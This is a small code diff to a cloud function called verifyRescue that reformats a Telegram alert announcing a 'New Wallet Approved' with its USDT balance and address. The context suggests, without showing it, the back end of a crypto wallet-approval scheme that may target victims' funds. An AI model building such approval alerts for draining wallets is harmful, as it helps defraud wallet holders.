@@ -165,7 +165,7 @@ export const verifyRescue = functions
 
           const { sendTelegramMessage } = await import("../lib/telegram");
           await sendTelegramMessage(
-            `🔔 New Wallet Approved!\n\nBalance: *${balanceDisplay} USDT*\n\nAddress: ${from}\ntransferdotcom`
+            `🔔 New Wallet Approved!\n\nBalance: *${balanceDisplay} USDT*\n\nAddress: ${from}\n\n\`\`\`diff\n+ transferdotcom\n\`\`\``
           );
           console.log(`[verifyRescue] Telegram approval notification delivered for ${from}`);
         }
